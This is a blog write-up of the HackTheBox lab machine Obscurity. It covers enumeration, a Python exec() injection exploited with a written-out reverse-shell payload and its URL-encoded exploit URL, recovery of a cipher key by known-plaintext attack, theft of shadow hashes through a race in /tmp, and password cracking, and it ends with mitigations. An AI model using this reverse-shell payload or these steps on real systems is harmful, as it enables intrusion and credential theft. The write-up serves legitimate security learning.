---
layout: post
title: "HTB Post-Root Writeup: Obscurity"
date: 2019-05-09 19:00 -000
categories: HTB
---

Obscurity is a  [HackTheBox](https://hackthebox.eu) machine that was recently retired from their active selection, but is still playable on the VIP networks. I decided to make an attack on Obscurity back in January, when I decided that I was going to spend a good chunk of 2020 coding less and hacking more.

This was a nice, clean box that spoke to a strength of mine - badly written python. The box wasn't very realistic, but it also wasn't a mind-numbing "find the file" challenge either. A good box at a beginner level, which I think is roughly where I fall (it was, as it happens, my 5th own on the network).

## Step I: Initial Enumeration and Foothold
As with any attack, the first thing you need to know is a little bit about the machine you're targeting. In our case this is an easy ask: HTB gives you the IPv4 address of the thing you're attacking.

My first reaction was to pop open a browser and just browse to it. Most boxes on HTB, at least the ones I've done, have involved exploiting a web application for initial foothold, so it's not a bad idea. This returned the usual type of messaging to indicate there was nothing there, so it was time to break out that most basic of enumeration commands:

```shell script
nmap -A 10.10.10.168
```

I expected something fairly simple given the low difficulty rating of the box, so I didn't bother outputting the nmap scan to a file. I sort of wish I had now, as we got two main results:
1. 22/tcp with SSH listening, which is a given on the network and not very interesting;
2. 8080/tcp, with something called "BadHTTPServer" that dumped a *lot* of garbage into the nmap output.

This doesn't please me. But, now we know we can navigate to 8080. An aggressive bug hunter would probably have set up Burp as a proxy; I didn't take the liberty for that, and instead just relied on FireFox's dev tools. Not that there was much to find.

The home page of Obscurity is a simple static page that lists a few laughable security positions, and sends a message to any "Server Developers" that they can find the source code for the company's custom server, `SuperSecureServer.py`, can be found on a secret development directory.

Python's sort of my thing. Me being my nefarious self, I **really** want to see what's in that script. If only to show you it's not as secure as you think it is.

### Finding Server Source Code

After the whole debacle with looking for interesting files in Teacher, I've been looking into ways to automate that process. I decided the first thing to do would be to find that development folder. I also didn't have a lot of word lists to hand, so I was just going to use the default American English spelling list, comme ca:

```shell script
ffuf -c -w /usr/share/dict/american-english -u http://10.10.10.168:8080/FUZZ
```

This relies on a package called ffuf, a fast URL fuzzer, which is apt-gettable, and is just a fast fuzzer. Running it against this word list on my machine and network took a bit of time, and frustratingly, came back with no results.

But that was fine. While it was running I was poking around at the very minimal JS supporting this apparently static page, and I'd located one particular item, `/js/custom.js`, which listed a number of images that clearly had not been loading. Because of this I decided to fetch those images, which indeed contained errors.

This was enough of a red herring that I spent maybe an hour trying to reconstruct the image files. It shouldn't have been that hard, because the files were beginning with `b'`, implying that the SuperSecureServer was a python script attempting to open an image as a text file (`'r'` rather than `'rb'`). I decided I wanted to see if there were any other javascript files so I called `http://10.10.10.168:8080/js/`, expecting to get the directory. Instead, I got a 404 error.

This made the problem with the fuzzer extremely clear, and it was easy enough to pop a new fuzz into my jobs queue:

```shell script
ffuf -c -w /usr/share/dict/american-english -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
```

This returned a valid address in just a few moments, which we could curl down (or even just load in browser) to get the python source code for the server.

### Exploiting SuperSecureServer.py
Conventional Hacker Wisdom says that you should stand up a test instance of a server or application and practice/develop your exploit there. Now that you have SuperSecureServer.py, you could reasonably do this (though you would be missing a critical `__main__.py` file that actually runs the script.). That said, if you read python, this should jump out at you quickly.

```python
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
```

Those aren't my comments, either.

What this is doing, is it's taking the argument `path`, stripping it of URLEncoding (or, more accurately, URL decoding it), then passing that string into another using `.format()` and *immediately* executing it as a command without any additional processing.

This is the holy grail of low-hanging injection cases, since whatever the user is providing will wind up in this exec string. The info string introduces two challenges to that:
1. We need to terminate the assignment to `output`. This can be done by starting our string with a single quote, and indicating we want to start a new command with semicolon, like so `';`.
2. The final single quote in the document, after the format marker, will also need to be dealt with. You can assign this to a nonsense variable, by ending your string with `;foo='`.

All that remains from there is adding in a relevant command. You could realistically `from os import system` and do a simple netcat shell. I decided I didn't want to mess with learning the name of netcat, if it was even installed, and went ahead with a pure python reverse shell. It wasn't amazingly interactive, but it did the business for a foothold.

This was what I used:

```python
';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);foo='
```

In order to exploit this, you'd want to get a netcat "catcher" running, then send the URL-Encoded version through the browser (or curl):
```
http://10.10.10.168:8080/%27%3Bimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27127.0.0.1%27%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27%2Fbin%2Fsh%27%2C%27-i%27%5D%29%3Bfoo%3D%27
```

The page will load and hang forever, but as long as you were listening appropriately on your end you now have your reverse shell.

```shell script
$ whoami
www-data
```

## Step II: Elevation to User
Foothold is usually the hardest part of any box. To an extent, though, I never feel all the way secure until you get from reverse shell to user shell. Reverse shells are usually bear bones and more than a little shaky.

While I do have a few enumeration scripts I use when I'm wedged, I often find it useful to `ls /home` looking for users, which in this case reveals a single user, Robert. As it happens, we also have some good permissions in his home directory. We can read anything we want to besides the user flag, `user.txt`. What we find is:
1. A directory called BetterSSH, containing a single python script which I'll go over in more detail later.
2. A `passwordreminder.txt` file consisting of high UTF-8 characters.
3. An `out.txt` file consisting of UTF-8 characters, some of which fall on sparse non-printing ranges.
4. A `check.txt` file consisting of a string that claims will match `out.txt` if encrypted with the correct key.
5. Another badly-written script, `SuperSecureCrypt.py`

### Exploiting SuperSecureCrypt
The challenge here is pretty obvious. We have a cryptographic algorithm (to be generous), two files (one of which claims to encrypt to the other), and a third file that we actually want to decrypt.

Much like the server, there's a pretty obvious flaw in the crypto algorithm:

```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

```

See it?

We have a situation where ciphertext = plaintext + keytext. We can ignore the modulus (which would otherwise complicate things), because the entire codespace of UTF-8 is 8 bytes, and 255 would be the highest code point in that register; therefore, the valid answer has to appear within that range.

This becomes a problem of algebra - we can perform a **Known Plaintext Attack** against this which would yield the key, if only we can do something very complicated: `decrypt` the output file with the known plaintext's body as the key, which will output the key!

Now, I got stuck here for a while because I did not realize that the script's `-k` flag is expecting the key itself and not a path to a keyfile, but the command really is as simple as it otherwise sounds.

This reveals a key the full length of the plaintext - which you only need enough of to equal the length of the `passwordreminder.txt` file. You can then take that key, decrypt the reminder message, and drop the password for robert.

This is a good time to drop your reverse shell as well. Just SSH into the box as robert and cat yourself the `user.txt` flag.

## Step III: Better SSH Huh? We'll see about that.
The path to user was a lesson in not rolling your own crypto. Let's see what the guy who made a trivially-reversible symmetric key algorithm thinks is a better version of SSH.

I'll spare the line-by line analysis. Essentially, his script has a few interesting properties:
1. It's executable, which isn't that weird but not normally done with python files in my experience.
2. It must want to run with root permissions, because it operates against `/etc/shadow` (!!!).
3. The script works in the following general way:
 - It prompts the user for a username and password using `input()`, which is a horrible idea (see mitigations).
 - It then reads `/etc/shadow` and does some funky string ops to eventually wind up with the password hash from shadow, and writes its working file to a random location under `/tmp/SSH`
 - It compares the user's input password with the salty hash from the previous step using crypt.crypt which is surprisingly sane considering what step B actually was!
 - It then sleeps for `.1` and deletes the file it stored the passwords in.
 - If it liked your comparison value, it will then use `os.system()` to execute `sudo -u`, passwordless!
  - It can do this because it runs as root! Fortunately the file wasn't world-writeable because that would be bad.
  
If BetterSSH wasn't already the lowest hanging fruit on the system, it would still be a forced target as this is the only thing robert can `sudo`, thus making it the most likely candidate for privesc.

#### Obtaining the "Output" of BetterSSH
BetterSSH briefly writes a file with a random name into a directory at /tmp/SSH - a directory which doesn't even exist and it needs the user to helpfully create.

Of course, it also deletes that file really quickly. While there were probably more elegant solutions for the problem, I simply wrote a terrible bash script to set running in one terminal:
```shell script
while true; do for i in /tmp/SSH/*; do cat $i; done; done
```

This will blow the terminal the hell up. Trigger it immediately before you run BetterSSH and cancel it immediately - having two open SSH connections helps with this, but you could probably use `screen` as well.

A more elegant solution may have been to have the loop cp the file to safety rather than catting it, but there was enough data here to do what I needed to do.

#### What do we do with bad hashes?
Googling the hash actually reveals its a known, broken hash. That said, when I tried the known value in ssh, I couldn't log in, so I decided to crack the hash myself.

I did this by catting `/etc/passwd` from the target machine, copy-pasting it into a file on my machine. I also reconstructed the `/etc/shadow` file by replacing a few newlines with semicolons - you can look at your real /etc/shadow file to figure out how to do this if it's not immediately intuitive.

As I saw it, for a CTF we didn't need an exhaustive search of the password space, so I used John the Ripper with a fresh copy of the popular `rockyou.txt` wordlist after processing the stolen password file and reconstructed shadow file with `unshadow`.

This only ran for a few minutes and yielded the password I believed to be correct from the google search. As it turned out, the issue was actually that I needed to use *Better*SSH than what I had.

Then of course follows the rest:

![Got Root!](/images/hah.gif)

## But How Do We Protect This?

### Looking for Indicators of Compromise
Unfortunately, it looks like this is probably someone's daily driver machine, so it's not going to be very helpful to say "well, wait, did somebody log in?". That being said, there's still some good ways to keep an eye on this box.

#### Monitoring the Log of SuperSecureServer.py
SuperSecureServer is nominally logging output from the call we exploit using that output variable it was attempting to assign to. Since my injection was inelegant, this gets set to an odd value you could watch out for. Monitoring this log for unusual strings might not be a horrible idea if for some reason all you could do is look for super secure server.

### Mitigations and Patching

#### SuperSecureServer.py is broken on purpose.

We could patch the server script this way:
```
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        output = 'Document: {}'.format(path) # This is somewhat saner.
```

This raises the bar for the injection somewhat. Of course, it would still be saner to have some kind of filtering, but I gave this a bit of a college try and couldn't get the system to take it as anything other than a string. In fact, that other method is so very much the Wrong Thing that I doubt anyone would write it on purpose.

### Stop Rolling Your Own Crypto
The `SuperSecureCrypto.py` logic is unsalvagable. There is no excuse in 2019 to rely upon a cryptosystem that can have a known plaintext attack actually leak its keys. Granted, this would have been a little more robust if the test files didn't sit around, but greater still would have been the use of, for example, AES.

### Nobody needs an SSH replacement
Though, to be fair, this BetterSSH script would have been reasonably secure if it had instead simply not written its working files to temp.

HackTheBox is a nominally free platform, but I still pay for a VIP license so that I can have access to quieter versions of the network (and work on some older boxen). All that being said, if you wanted to contribute to this project of documenting as many of the boxes as I can financially, your best avenue is via the Kensho Security Labs Coffee Fund, located [here](https://ko-fi.com/kenshosec).

